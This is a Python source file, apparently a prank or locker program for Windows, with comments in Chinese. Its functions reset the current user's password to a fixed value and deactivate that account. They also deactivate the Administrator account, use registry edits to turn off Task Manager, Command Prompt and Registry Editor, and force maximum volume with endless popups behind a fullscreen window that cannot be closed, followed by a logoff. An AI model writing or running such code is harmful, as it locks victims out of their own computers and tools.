import os
import sys
import threading

from PySide6.QtWidgets import QMainWindow, QApplication, QWidget, QMessageBox
from PySide6.QtCore import QTimer

from comtypes import CLSCTX_ALL
from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
from ctypes import POINTER, cast
import comtypes

# 设置音量
def setAudio(num: float):
    devices = AudioUtilities.GetSpeakers()
    interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
    volume_interface = cast(interface, POINTER(IAudioEndpointVolume))
    # 设置音量（0.0到1.0之间的浮点数）
    volume_interface.SetMasterVolumeLevelScalar(num, None)

def getAudioEndpointVolume():
    try:
        devices = AudioUtilities.GetSpeakers()
        interface = devices.Activate(
            IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
        volume = cast(interface, POINTER(IAudioEndpointVolume))
        return volume
    except comtypes.COMError as e:
        print(f"COMError: {e}")
        return None

# 取消静音
def clearMute():
    volume = getAudioEndpointVolume()
    if volume is None:
        print("无法获取音频设备")
        return

    try:
        if volume.GetMute():
            volume.SetMute(0, None)
            print("系统已解除静音")
        else:
            print("系统未处于静音状态")
    except comtypes.COMError as e:
        print(f"COMError: {e}")

class MainWindow(QMainWindow, QWidget, QApplication):

    def closeEvent(self, event):
        # 重载关闭事件，使得窗口关闭时只是隐藏而不是退出应用程序
        event.ignore()  # 忽略关闭事件
        self.show()     #

    def death(self):
        QMessageBox.information(self, 'Error', '曼波!')

def addEvents():
    while True:
        setAudio(1.0)
        clearMute()
        MainWindow().death()

def disableTaskManage(num):
    os.system(f'reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskMgr /t REG_DWORD /d {num} /f')

def setPassword(password):
    os.system('echo %username% > userName')

    file = open('./userName', 'r', encoding='utf-8')
    userName = file.readlines()
    userName = userName[0].split()[0]

    print(userName)

    os.system(f'net user {userName} {password}')
    os.system(f'net user {userName} /active:no')
    file.close()
    os.remove('./userName')

def disableUser():
    os.system('net user administrator /active:no')

def disableCMD():
    os.system(f'reg add "HKCU\Software\Policies\Microsoft\Windows\System" /v DisableCMD /t REG_DWORD /d 1 /f')

def disableRegedit():
    os.system(f'reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableRegedit /t REG_DWORD /d 1 /f')

def getFilePath(file_name):
    # 获取打包后的可执行文件所在的临时目录
    basePath = getattr(sys, '_MEIPASS', os.path.abspath(os.path.dirname(__file__)))
    # 构建视频文件的绝对路径
    return os.path.join(basePath, file_name)

def backgroundTasks():
    # 后台任务（运行在辅助线程中）
    setPassword(1145141919810)
    disableTaskManage(1)
    disableUser()
    disableCMD()
    disableRegedit()
    QTimer.singleShot(120, lambda: os.system('logoff'))
    addEvents()

def main():
    threading.Thread(target=backgroundTasks).start()
    app = QApplication(sys.argv)
    window = MainWindow()
    window.showFullScreen()
    sys.exit(app.exec_())

if __name__ == '__main__':
    # main()
    disableCMD()